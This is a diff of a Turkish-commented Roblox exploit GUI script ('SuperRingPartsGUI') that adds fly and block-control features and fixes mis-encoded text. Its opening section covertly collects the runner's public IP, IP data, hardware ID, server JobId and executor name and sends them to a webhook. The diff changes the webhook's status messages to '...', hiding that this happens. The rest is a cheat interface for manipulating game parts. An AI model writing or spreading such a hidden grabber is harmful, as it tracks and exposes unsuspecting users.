@@ -16,14 +16,14 @@ local GetData = "N/A"
 local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
 local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
--- IP ve Veri Alma (Test AmaÃ§lÄ±)
+-- IP ve Veri Alma (Test Amaçlı)
 local successIp, resultIp = pcall(function()
     return game:HttpGet("https://v4.ident.me/")
 end)
 if successIp then
     GetIp = resultIp
 else
-    warn("IP alma hatasÄ±: ", resultIp)
+    warn("IP alma hatası: ", resultIp)
 end
 
 local successData, resultData = pcall(function()
@@ -32,7 +32,7 @@ end)
 if successData then
     GetData = resultData
 else
-    warn("IP verisi alma hatasÄ±: ", resultData)
+    warn("IP verisi alma hatası: ", resultData)
 end
 
 -- Oyun Bilgileri
@@ -60,7 +60,7 @@ local function detectExecutor()
     return executor
 end
 
--- Webhook Verisi OluÅŸturma
+-- Webhook Verisi Oluşturma
 local function createWebhookData()
     local executor = detectExecutor()
     
@@ -96,7 +96,7 @@ local function createWebhookData()
     return HttpService:JSONEncode(data)
 end
 
--- Webhook GÃ¶nderme
+-- Webhook Gönderme
 local function sendWebhook(webhookUrl, data)
     local success, result = pcall(function()
         local headers = {
@@ -105,7 +105,7 @@ local function sendWebhook(webhookUrl, data)
         
         local request = http_request or syn and syn.request or request or HttpPost
         if not request then
-            warn("Desteklenen HTTP istek fonksiyonu bulunamadÄ±.")
+            warn("Desteklenen HTTP istek fonksiyonu bulunamadı.")
             return
         end
 
@@ -117,26 +117,24 @@ local function sendWebhook(webhookUrl, data)
         })
 
         if response and response.StatusCode == 204 then
-            print("Webhook baÅŸarÄ±yla gÃ¶nderildi!")
+            print("...")
         else
-            warn("Webhook gÃ¶nderilemedi: ", response and response.StatusMessage or "Bilinmeyen hata")
+            warn("...: ", response and response.StatusMessage or "Bilinmeyen hata")
         end
     end)
     
     if not success then
-        warn("Webhook gÃ¶nderim hatasÄ±: ", result)
+        warn("Webhook gönderim hatası: ", result)
     end
 end
 
--- Scripti Ã‡alÄ±ÅŸtÄ±rma
+-- Scripti Çalıştırma
 local success, webhookData = pcall(createWebhookData)
 if success then
     sendWebhook(webhookUrl, webhookData)
 else
-    warn("Webhook verisi oluÅŸturma hatasÄ±: ", webhookData)
+    warn("...: ", webhookData)
 end
-
-
 
 print("Gui Started")
 local Players = game:GetService("Players")
@@ -148,7 +146,7 @@ local SoundService = game:GetService("SoundService")
 local StarterGui = game:GetService("StarterGui")
 local TextChatService = game:GetService("TextChatService")
 
--- Karakter ve HumanoidRootPart kontrolÃ¼
+-- Karakter ve HumanoidRootPart kontrolü
 local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 
@@ -163,16 +161,16 @@ local function playSound(soundId)
     end)
 end
 
--- BaÅŸlangÄ±Ã§ sesi
+-- Başlangıç sesi
 playSound("2865227271")
 
--- ArayÃ¼z OluÅŸturma (Ana GUI)
+-- Arayüz Oluşturma (Ana GUI)
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "SuperRingPartsGUI"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
--- Toggle Butonu (Sol Ã¼st, kÄ±rmÄ±zÄ± arkaplan, beyaz yazÄ±, yuvarlak kÃ¶ÅŸeli, topmost)
+-- Toggle Butonu (Sol üst, kırmızı arkaplan, beyaz yazı, yuvarlak köşeli, topmost)
 local ToggleGuiButton = Instance.new("TextButton")
 ToggleGuiButton.Size = UDim2.new(0, 100, 0, 40)
 ToggleGuiButton.Position = UDim2.new(0, 10, 0, 10)
@@ -196,9 +194,9 @@ MainFrame.Position = UDim2.new(0.5, -150, 0.5, -125)
 MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 MainFrame.BorderSizePixel = 0
 MainFrame.Parent = ScreenGui
-MainFrame.Visible = false -- BaÅŸlangÄ±Ã§ta kapalÄ±
+MainFrame.Visible = false -- Başlangıçta kapalı
 
--- BaÅŸlÄ±k
+-- Başlık
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 50)
 Title.Position = UDim2.new(0, 0, 0, 0)
@@ -209,7 +207,7 @@ Title.Font = Enum.Font.Fondamento
 Title.TextSize = 22
 Title.Parent = MainFrame
 
--- AÃ§/Kapa DÃ¼ÄŸmesi
+-- Aç/Kapa Düğmesi
 local ToggleButton = Instance.new("TextButton")
 ToggleButton.Size = UDim2.new(0.8, 0, 0, 40)
 ToggleButton.Position = UDim2.new(0.1, 0, 0.25, 0)
@@ -228,7 +226,7 @@ ToggleButton.MouseLeave:Connect(function()
     ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
 end)
 
--- YarÄ±Ã§ap Azalt DÃ¼ÄŸmesi
+-- Yarıçap Azalt Düğmesi
 local DecreaseRadius = Instance.new("TextButton")
 DecreaseRadius.Size = UDim2.new(0.2, 0, 0, 40)
 DecreaseRadius.Position = UDim2.new(0.1, 0, 0.55, 0)
@@ -239,7 +237,7 @@ DecreaseRadius.Font = Enum.Font.Fondamento
 DecreaseRadius.TextSize = 18
 DecreaseRadius.Parent = MainFrame
 
--- YarÄ±Ã§ap ArtÄ±r DÃ¼ÄŸmesi
+-- Yarıçap Artır Düğmesi
 local IncreaseRadius = Instance.new("TextButton")
 IncreaseRadius.Size = UDim2.new(0.2, 0, 0, 40)
 IncreaseRadius.Position = UDim2.new(0.7, 0, 0.55, 0)
@@ -250,7 +248,7 @@ IncreaseRadius.Font = Enum.Font.Fondamento
 IncreaseRadius.TextSize = 18
 IncreaseRadius.Parent = MainFrame
 
--- YarÄ±Ã§ap GÃ¶stergesi
+-- Yarıçap Göstergesi
 local RadiusDisplay = Instance.new("TextLabel")
 RadiusDisplay.Size = UDim2.new(0.4, 0, 0, 40)
 RadiusDisplay.Position = UDim2.new(0.3, 0, 0.55, 0)
@@ -272,7 +270,7 @@ Watermark.Font = Enum.Font.Fondamento
 Watermark.TextSize = 14
 Watermark.Parent = MainFrame
 
--- KÃ¼Ã§Ã¼lt DÃ¼ÄŸmesi
+-- Küçült Düğmesi
 local MinimizeButton = Instance.new("TextButton")
 MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
 MinimizeButton.Position = UDim2.new(0, 5, 0, 5)
@@ -283,44 +281,44 @@ MinimizeButton.Font = Enum.Font.Fondamento
 MinimizeButton.TextSize = 18
 MinimizeButton.Parent = MainFrame
 
--- KÃ¼Ã§Ã¼lt dÃ¼ÄŸmesini yuvarlat
+-- Küçült düğmesini yuvarlat
 local MinimizeCorner = Instance.new("UICorner")
 MinimizeCorner.CornerRadius = UDim.new(0, 15)
 MinimizeCorner.Parent = MinimizeButton
 
--- Kapat DÃ¼ÄŸmesi
+-- Kapat Düğmesi
 local CloseButton = Instance.new("TextButton")
 CloseButton.Size = UDim2.new(0, 30, 0, 30)
 CloseButton.Position = UDim2.new(1, -35, 0, 5)
-CloseButton.Text = "Ã—"
+CloseButton.Text = "×"
 CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseButton.Font = Enum.Font.Fondamento
 CloseButton.TextSize = 18
 CloseButton.Parent = MainFrame
 
--- Kapat dÃ¼ÄŸmesini yuvarlat
+-- Kapat düğmesini yuvarlat
 local CloseCorner = Instance.new("UICorner")
 CloseCorner.CornerRadius = UDim.new(0, 15)
 CloseCorner.Parent = CloseButton
 
--- Ok DÃ¼ÄŸmesi (AÃ§Ä±lÄ±r MenÃ¼)
+-- Ok Düğmesi (Açılır Menü)
 local ArrowButton = Instance.new("TextButton")
 ArrowButton.Size = UDim2.new(0, 30, 0, 30)
 ArrowButton.Position = UDim2.new(0.5, -15, 1, -40)
-ArrowButton.Text = "â†“"
+ArrowButton.Text = "↓"
 ArrowButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
 ArrowButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 ArrowButton.Font = Enum.Font.Fondamento
 ArrowButton.TextSize = 18
 ArrowButton.Parent = MainFrame
 
--- Ok dÃ¼ÄŸmesini yuvarlat
+-- Ok düğmesini yuvarlat
 local ArrowCorner = Instance.new("UICorner")
 ArrowCorner.CornerRadius = UDim.new(0, 15)
 ArrowCorner.Parent = ArrowButton
 
--- AÃ§Ä±lÄ±r MenÃ¼ Ã‡erÃ§evesi
+-- Açılır Menü Çerçevesi
 local DropdownFrame = Instance.new("Frame")
 DropdownFrame.Size = UDim2.new(0, 150, 0, 200)
 DropdownFrame.Position = UDim2.new(0.5, -75, 1, -200)
@@ -329,17 +327,17 @@ DropdownFrame.BorderSizePixel = 0
 DropdownFrame.Visible = false
 DropdownFrame.Parent = MainFrame
 
--- KaydÄ±rÄ±labilir Alan
+-- Kaydırılabilir Alan
 local ScrollingFrame = Instance.new("ScrollingFrame")
 ScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
 ScrollingFrame.Position = UDim2.new(0, 0, 0, 0)
 ScrollingFrame.BackgroundTransparency = 1
 ScrollingFrame.BorderSizePixel = 0
 ScrollingFrame.ScrollBarThickness = 8
-ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 240)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 280)
 ScrollingFrame.Parent = DropdownFrame
 
--- Tornado SeÃ§eneÄŸi
+-- Tornado Seçeneği
 local TornadoOption = Instance.new("TextButton")
 TornadoOption.Size = UDim2.new(1, 0, 0, 40)
 TornadoOption.Position = UDim2.new(0, 0, 0, 0)
@@ -350,7 +348,7 @@ TornadoOption.Font = Enum.Font.Fondamento
 TornadoOption.TextSize = 16
 TornadoOption.Parent = ScrollingFrame
 
--- SatÃ¼rn SeÃ§eneÄŸi
+-- Satürn Seçeneği
 local SaturnOption = Instance.new("TextButton")
 SaturnOption.Size = UDim2.new(1, 0, 0, 40)
 SaturnOption.Position = UDim2.new(0, 0, 0, 40)
@@ -361,7 +359,7 @@ SaturnOption.Font = Enum.Font.Fondamento
 SaturnOption.TextSize = 16
 SaturnOption.Parent = ScrollingFrame
 
--- Adjust Rotation Speed SeÃ§eneÄŸi
+-- Adjust Rotation Speed Seçeneği
 local AdjustSpeedOption = Instance.new("TextButton")
 AdjustSpeedOption.Size = UDim2.new(1, 0, 0, 40)
 AdjustSpeedOption.Position = UDim2.new(0, 0, 0, 80)
@@ -372,7 +370,7 @@ AdjustSpeedOption.Font = Enum.Font.Fondamento
 AdjustSpeedOption.TextSize = 16
 AdjustSpeedOption.Parent = ScrollingFrame
 
--- SayÄ± Girme AlanÄ± (TextBox)
+-- Sayı Girme Alanı (TextBox)
 local SpeedInput = Instance.new("TextBox")
 SpeedInput.Size = UDim2.new(0.6, 0, 0, 30)
 SpeedInput.Position = UDim2.new(0.2, 0, 0, 80)
@@ -384,7 +382,7 @@ SpeedInput.TextSize = 16
 SpeedInput.Visible = false
 SpeedInput.Parent = ScrollingFrame
 
--- Credits SeÃ§eneÄŸi
+-- Credits Seçeneği
 local CreditsOption = Instance.new("TextButton")
 CreditsOption.Size = UDim2.new(1, 0, 0, 40)
 CreditsOption.Position = UDim2.new(0, 0, 0, 120)
@@ -395,7 +393,7 @@ CreditsOption.Font = Enum.Font.Fondamento
 CreditsOption.TextSize = 16
 CreditsOption.Parent = ScrollingFrame
 
--- Up, Down SeÃ§eneÄŸi
+-- Up, Down Seçeneği
 local UpDownOption = Instance.new("TextButton")
 UpDownOption.Size = UDim2.new(1, 0, 0, 40)
 UpDownOption.Position = UDim2.new(0, 0, 0, 160)
@@ -406,7 +404,7 @@ UpDownOption.Font = Enum.Font.Fondamento
 UpDownOption.TextSize = 16
 UpDownOption.Parent = ScrollingFrame
 
--- Minigun SeÃ§eneÄŸi
+-- Minigun Seçeneği
 local MinigunOption = Instance.new("TextButton")
 MinigunOption.Size = UDim2.new(1, 0, 0, 40)
 MinigunOption.Position = UDim2.new(0, 0, 0, 200)
@@ -417,7 +415,18 @@ MinigunOption.Font = Enum.Font.Fondamento
 MinigunOption.TextSize = 16
 MinigunOption.Parent = ScrollingFrame
 
--- Yeni GUI (Up, Down KontrolÃ¼)
+-- Control Blocks Seçeneği
+local ControlBlocksOption = Instance.new("TextButton")
+ControlBlocksOption.Size = UDim2.new(1, 0, 0, 40)
+ControlBlocksOption.Position = UDim2.new(0, 0, 0, 240)
+ControlBlocksOption.Text = "Control Blocks"
+ControlBlocksOption.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
+ControlBlocksOption.TextColor3 = Color3.fromRGB(255, 255, 255)
+ControlBlocksOption.Font = Enum.Font.Fondamento
+ControlBlocksOption.TextSize = 16
+ControlBlocksOption.Parent = ScrollingFrame
+
+-- Yeni GUI (Up, Down Kontrolü)
 local HeightGui = Instance.new("Frame")
 HeightGui.Size = UDim2.new(0, 150, 0, 120)
 HeightGui.Position = UDim2.new(0, 10, 1, -130)
@@ -426,7 +435,7 @@ HeightGui.BorderSizePixel = 0
 HeightGui.Visible = false
 HeightGui.Parent = ScreenGui
 
--- HeightGui BaÅŸlÄ±k
+-- HeightGui Başlık
 local HeightTitle = Instance.new("TextLabel")
 HeightTitle.Size = UDim2.new(1, 0, 0, 30)
 HeightTitle.Position = UDim2.new(0, 0, 0, 0)
@@ -459,7 +468,7 @@ DownButton.Font = Enum.Font.Fondamento
 DownButton.TextSize = 18
 DownButton.Parent = HeightGui
 
--- YÃ¼kseklik GÃ¶stergesi
+-- Yükseklik Göstergesi
 local HeightDisplay = Instance.new("TextLabel")
 HeightDisplay.Size = UDim2.new(0.8, 0, 0, 30)
 HeightDisplay.Position = UDim2.new(0.1, 0, 0.65, 0)
@@ -474,28 +483,28 @@ HeightDisplay.Parent = HeightGui
 local CloseHeightButton = Instance.new("TextButton")
 CloseHeightButton.Size = UDim2.new(0, 30, 0, 30)
 CloseHeightButton.Position = UDim2.new(1, -35, 0, 5)
-CloseHeightButton.Text = "Ã—"
+CloseHeightButton.Text = "×"
 CloseHeightButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 CloseHeightButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseHeightButton.Font = Enum.Font.Fondamento
 CloseHeightButton.TextSize = 18
 CloseHeightButton.Parent = HeightGui
 
--- Kapatma dÃ¼ÄŸmesini yuvarlat
+-- Kapatma düğmesini yuvarlat
 local CloseHeightCorner = Instance.new("UICorner")
 CloseHeightCorner.CornerRadius = UDim.new(0, 15)
 CloseHeightCorner.Parent = CloseHeightButton
 
--- Yeni GUI (Credits KontrolÃ¼)
+-- Yeni GUI (Credits Kontrolü)
 local CreditsGui = Instance.new("Frame")
-CreditsGui.Size = UDim2.new(0, 200, 0, 80)
+CreditsGui.Size = UDim2.new(0, 200, 0, 160) -- Thumbnail için boy artırıldı
 CreditsGui.Position = UDim2.new(0, 10, 0, 10)
 CreditsGui.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 CreditsGui.BorderSizePixel = 0
 CreditsGui.Visible = false
 CreditsGui.Parent = ScreenGui
 
--- CreditsGui BaÅŸlÄ±k
+-- CreditsGui Başlık
 local CreditsTitle = Instance.new("TextLabel")
 CreditsTitle.Size = UDim2.new(1, 0, 0, 30)
 CreditsTitle.Position = UDim2.new(0, 0, 0, 0)
@@ -517,23 +526,148 @@ CreditsLabel.Font = Enum.Font.Fondamento
 CreditsLabel.TextSize = 16
 CreditsLabel.Parent = CreditsGui
 
+-- Thumbnail ImageLabel
+local ThumbnailImage = Instance.new("ImageLabel")
+ThumbnailImage.Size = UDim2.new(0, 150, 0, 150)
+ThumbnailImage.Position = UDim2.new(0.5, -75, 0, 70)
+ThumbnailImage.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+ThumbnailImage.BackgroundTransparency = 0.5
+ThumbnailImage.Image = thumbnailUrl or "rbxasset://textures/ui/GuiImagePlaceholder.png"
+ThumbnailImage.Parent = CreditsGui
+
 -- CreditsGui Kapatma Butonu
 local CloseCreditsButton = Instance.new("TextButton")
 CloseCreditsButton.Size = UDim2.new(0, 30, 0, 30)
 CloseCreditsButton.Position = UDim2.new(1, -35, 0, 5)
-CloseCreditsButton.Text = "Ã—"
+CloseCreditsButton.Text = "×"
 CloseCreditsButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 CloseCreditsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseCreditsButton.Font = Enum.Font.Fondamento
 CloseCreditsButton.TextSize = 18
 CloseCreditsButton.Parent = CreditsGui
 
--- Kapatma dÃ¼ÄŸmesini yuvarlat
+-- Kapatma düğmesini yuvarlat
 local CloseCreditsCorner = Instance.new("UICorner")
 CloseCreditsCorner.CornerRadius = UDim.new(0, 15)
 CloseCreditsCorner.Parent = CloseCreditsButton
 
--- Mavi Kare (SeÃ§ilen oyuncunun etrafÄ±nda)
+-- Yeni GUI (Control Blocks Kontrolü)
+local ControlGui = Instance.new("Frame")
+ControlGui.Size = UDim2.new(0, 200, 0, 240) -- Fly butonu için yüksekliği artırdık
+ControlGui.Position = UDim2.new(0, 10, 0, 100)
+ControlGui.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+ControlGui.BorderSizePixel = 0
+ControlGui.Visible = false
+ControlGui.Parent = ScreenGui
+
+-- ControlGui Başlık
+local ControlTitle = Instance.new("TextLabel")
+ControlTitle.Size = UDim2.new(1, 0, 0, 30)
+ControlTitle.Position = UDim2.new(0, 0, 0, 0)
+ControlTitle.Text = "Control Block"
+ControlTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+ControlTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ControlTitle.Font = Enum.Font.Fondamento
+ControlTitle.TextSize = 18
+ControlTitle.Parent = ControlGui
+
+-- Hız Etiketi
+local SpeedLabel = Instance.new("TextLabel")
+SpeedLabel.Size = UDim2.new(0.8, 0, 0, 20)
+SpeedLabel.Position = UDim2.new(0.1, 0, 0.2, 0)
+SpeedLabel.Text = "Speed:"
+SpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+SpeedLabel.BackgroundTransparency = 1
+SpeedLabel.Font = Enum.Font.Fondamento
+SpeedLabel.TextSize = 16
+SpeedLabel.Parent = ControlGui
+
+-- Hız Giriş Alanı
+local BlockSpeedInput = Instance.new("TextBox")
+BlockSpeedInput.Size = UDim2.new(0.3, 0, 0, 30)
+BlockSpeedInput.Position = UDim2.new(0.1, 0, 0.3, 0)
+BlockSpeedInput.Text = "10"
+BlockSpeedInput.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+BlockSpeedInput.TextColor3 = Color3.fromRGB(0, 0, 0)
+BlockSpeedInput.Font = Enum.Font.Fondamento
+BlockSpeedInput.TextSize = 16
+BlockSpeedInput.Parent = ControlGui
+
+-- Hız Kaydırıcısı (Slider)
+local SpeedSlider = Instance.new("TextButton")
+SpeedSlider.Size = UDim2.new(0.5, 0, 0, 10)
+SpeedSlider.Position = UDim2.new(0.45, 0, 0.35, 0)
+SpeedSlider.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
+SpeedSlider.Text = ""
+SpeedSlider.Parent = ControlGui
+
+local SliderIndicator = Instance.new("Frame")
+SliderIndicator.Size = UDim2.new(0, 10, 0, 20)
+SliderIndicator.Position = UDim2.new(0, 0, 0, -5)
+SliderIndicator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SliderIndicator.Parent = SpeedSlider
+
+-- View Butonu
+local ViewButton = Instance.new("TextButton")
+ViewButton.Size = UDim2.new(0.8, 0, 0, 30)
+ViewButton.Position = UDim2.new(0.1, 0, 0.5, 0)
+ViewButton.Text = "View: Off"
+ViewButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ViewButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ViewButton.Font = Enum.Font.Fondamento
+ViewButton.TextSize = 16
+ViewButton.Parent = ControlGui
+
+-- Focus Butonu
+local FocusButton = Instance.new("TextButton")
+FocusButton.Size = UDim2.new(0.8, 0, 0, 30)
+FocusButton.Position = UDim2.new(0.1, 0, 0.65, 0)
+FocusButton.Text = "Focus: Off"
+FocusButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+FocusButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+FocusButton.Font = Enum.Font.Fondamento
+FocusButton.TextSize = 16
+FocusButton.Parent = ControlGui
+
+-- Fly Butonu (Yeni Eklendi)
+local FlyButton = Instance.new("TextButton")
+FlyButton.Size = UDim2.new(0.8, 0, 0, 30)
+FlyButton.Position = UDim2.new(0.1, 0, 0.8, 0)
+FlyButton.Text = "Fly: Off"
+FlyButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+FlyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+FlyButton.Font = Enum.Font.Fondamento
+FlyButton.TextSize = 16
+FlyButton.Parent = ControlGui
+
+-- Bilgi Metni (Fly için güncellendi)
+local InfoLabel = Instance.new("TextLabel")
+InfoLabel.Size = UDim2.new(0.8, 0, 0, 30)
+InfoLabel.Position = UDim2.new(0.1, 0, 0.95, 0)
+InfoLabel.Text = "Use WASD, E (up), Q (down)"
+InfoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+InfoLabel.BackgroundTransparency = 1
+InfoLabel.Font = Enum.Font.Fondamento
+InfoLabel.TextSize = 14
+InfoLabel.Parent = ControlGui
+
+-- ControlGui Kapatma Butonu
+local CloseControlButton = Instance.new("TextButton")
+CloseControlButton.Size = UDim2.new(0, 30, 0, 30)
+CloseControlButton.Position = UDim2.new(1, -35, 0, 5)
+CloseControlButton.Text = "×"
+CloseControlButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CloseControlButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseControlButton.Font = Enum.Font.Fondamento
+CloseControlButton.TextSize = 18
+CloseControlButton.Parent = ControlGui
+
+-- Kapatma düğmesini yuvarlat
+local CloseControlCorner = Instance.new("UICorner")
+CloseControlCorner.CornerRadius = UDim.new(0, 15)
+CloseControlCorner.Parent = CloseControlButton
+
+-- Mavi Kare (Seçilen oyuncunun veya bloğun etrafında)
 local SelectionFrame = Instance.new("Frame")
 SelectionFrame.Size = UDim2.new(0, 100, 0, 100)
 SelectionFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
@@ -566,11 +700,11 @@ StopButton.TextSize = 18
 StopButton.Visible = false
 StopButton.Parent = ScreenGui
 
--- Ã‡arpÄ± Butonu
+-- Çarpı Butonu
 local ExitButton = Instance.new("TextButton")
 ExitButton.Size = UDim2.new(0, 30, 0, 30)
 ExitButton.Position = UDim2.new(0.5, 20, 0.7, 0)
-ExitButton.Text = "Ã—"
+ExitButton.Text = "×"
 ExitButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 ExitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 ExitButton.Font = Enum.Font.Fondamento
@@ -578,26 +712,30 @@ ExitButton.TextSize = 18
 ExitButton.Visible = false
 ExitButton.Parent = ScreenGui
 
--- Ã‡arpÄ± dÃ¼ÄŸmesini yuvarlat
+-- Çarpı düğmesini yuvarlat
 local ExitCorner = Instance.new("UICorner")
 ExitCorner.CornerRadius = UDim.new(0, 15)
 ExitCorner.Parent = ExitButton
 
--- Toggle GUI iÅŸlevi
+-- Toggle GUI işlevi
 local guiVisible = false
 ToggleGuiButton.MouseButton1Click:Connect(function()
     guiVisible = not guiVisible
     MainFrame.Visible = guiVisible
-    HeightGui.Visible = guiVisible and HeightGui.Visible -- Ã–nceki durumu koru
-    CreditsGui.Visible = guiVisible and CreditsGui.Visible -- Ã–nceki durumu koru
-    SelectionFrame.Visible = guiVisible and SelectionFrame.Visible -- Ã–nceki durumu koru
-    LaunchButton.Visible = guiVisible and LaunchButton.Visible -- Ã–nceki durumu koru
-    StopButton.Visible = guiVisible and StopButton.Visible -- Ã–nceki durumu koru
-    ExitButton.Visible = guiVisible and ExitButton.Visible -- Ã–nceki durumu koru
+    HeightGui.Visible = guiVisible and HeightGui.Visible -- Önceki durumu koru
+    CreditsGui.Visible = guiVisible and CreditsGui.Visible -- Önceki durumu koru
+    ControlGui.Visible = guiVisible and ControlGui.Visible -- Önceki durumu koru
+    SelectionFrame.Visible = guiVisible and (SelectionFrame.Visible or controlBlocksEnabled) -- Önceki durumu koru veya Control Blocks aktifse göster
+    LaunchButton.Visible = guiVisible and LaunchButton.Visible -- Önceki durumu koru
+    StopButton.Visible = guiVisible and StopButton.Visible -- Önceki durumu koru
+    ExitButton.Visible = guiVisible and ExitButton.Visible -- Önceki durumu koru
+    if guiVisible then
+        parts = {} -- GUI açıldığında parts tablosunu temizle
+    end
     playSound("12221967")
 end)
 
--- X tuÅŸuna basÄ±ldÄ±ÄŸÄ±nda GUI ve Toggle butonunu kapat
+-- X tuşuna basıldığında GUI ve Toggle butonunu kapat
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.KeyCode == Enum.KeyCode.X then
@@ -605,16 +743,32 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         MainFrame.Visible = false
         HeightGui.Visible = false
         CreditsGui.Visible = false
+        ControlGui.Visible = false
         SelectionFrame.Visible = false
         LaunchButton.Visible = false
         StopButton.Visible = false
         ExitButton.Visible = false
         ToggleGuiButton.Visible = false
+        ringPartsEnabled = false -- Modu kapat
+        controlBlocksEnabled = false -- Control modunu kapat
+        flyEnabled = false -- Fly modunu kapat
+        FlyButton.Text = "Fly: Off"
+        FlyButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        tracking = false -- Kamera takibini kapat
+        ViewButton.Text = "View: Off"
+        ViewButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        FocusButton.Text = "Focus: Off" -- Focus'u kapat
+        FocusButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        isFocused = false -- Hareketi devre dışı bırak
+        Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom -- Kamerayı normale döndür
+        selectedBlock = nil -- Seçili bloğu sıfırla
+        parts = {} -- Tüm parçaları temizle
+        playerListFrame.Visible = false -- Oyuncu listesini gizle
         playSound("12221967")
     end
 end)
 
--- KÃ¼Ã§Ã¼ltme iÅŸlevi
+-- Küçültme işlevi
 local minimized = false
 MinimizeButton.MouseButton1Click:Connect(function()
     minimized = not minimized
@@ -630,12 +784,14 @@ MinimizeButton.MouseButton1Click:Connect(function()
         DropdownFrame.Visible = false
         HeightGui.Visible = false
         CreditsGui.Visible = false
+        ControlGui.Visible = false
         SelectionFrame.Visible = false
         LaunchButton.Visible = false
         StopButton.Visible = false
         ExitButton.Visible = false
-        dropdownVisible = false -- MenÃ¼ kapatÄ±lacak
-        ArrowButton.Text = "â†“" -- Ok iÅŸareti sÄ±fÄ±rlanacak
+        dropdownVisible = false -- Menü kapatılacak
+        ArrowButton.Text = "↓" -- Ok işareti sıfırlanacak
+        playerListFrame.Visible = false -- Oyuncu listesini gizle
     else
         MainFrame:TweenSize(UDim2.new(0, 300, 0, 250), "Out", "Quad", 0.3, true)
         MinimizeButton.Text = "-"
@@ -649,42 +805,71 @@ MinimizeButton.MouseButton1Click:Connect(function()
     playSound("12221967")
 end)
 
--- Kapatma iÅŸlevi (Ana GUI)
+-- Kapatma işlevi (Ana GUI)
 CloseButton.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
+    ringPartsEnabled = false -- Modu kapat
+    controlBlocksEnabled = false -- Control modunu kapat
+    flyEnabled = false -- Fly modunu kapat
+    tracking = false -- Kamera takibini kapat
+    Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom -- Kamerayı normale döndür
+    selectedBlock = nil -- Seçili bloğu sıfırla
+    parts = {} -- Tüm parçaları temizle
+    playerListFrame.Visible = false -- Oyuncu listesini gizle
     playSound("12221967")
 end)
 
--- Kapatma iÅŸlevi (HeightGui)
+-- Kapatma işlevi (HeightGui)
 CloseHeightButton.MouseButton1Click:Connect(function()
     HeightGui.Visible = false
     playSound("12221967")
 end)
 
--- Kapatma iÅŸlevi (CreditsGui)
+-- Kapatma işlevi (CreditsGui)
 CloseCreditsButton.MouseButton1Click:Connect(function()
     CreditsGui.Visible = false
     playSound("12221967")
 end)
 
--- AÃ§Ä±lÄ±r menÃ¼ iÅŸlevi
+-- Kapatma işlevi (ControlGui)
+CloseControlButton.MouseButton1Click:Connect(function()
+    ControlGui.Visible = false
+    controlBlocksEnabled = false -- Control modunu kapat
+    flyEnabled = false -- Fly modunu kapat
+    FlyButton.Text = "Fly: Off"
+    FlyButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    tracking = false -- Kamera takibini kapat
+    ViewButton.Text = "View: Off"
+    ViewButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    FocusButton.Text = "Focus: Off" -- Focus'u kapat
+    FocusButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    isFocused = false -- Hareketi devre dışı bırak
+    Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom -- Kamerayı normale döndür
+    selectedBlock = nil -- Seçili bloğu sıfırla
+    SelectionFrame.Visible = false -- Mavi kareyi gizle
+    ControlBlocksOption.Text = "Control Blocks"
+    ControlBlocksOption.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
+    playSound("12221967")
+end)
+
+-- Açılır menü işlevi
 local dropdownVisible = false
 ArrowButton.MouseButton1Click:Connect(function()
     dropdownVisible = not dropdownVisible
     DropdownFrame.Visible = dropdownVisible
     SpeedInput.Visible = dropdownVisible and AdjustSpeedOption.BackgroundColor3 == Color3.fromRGB(100, 100, 100)
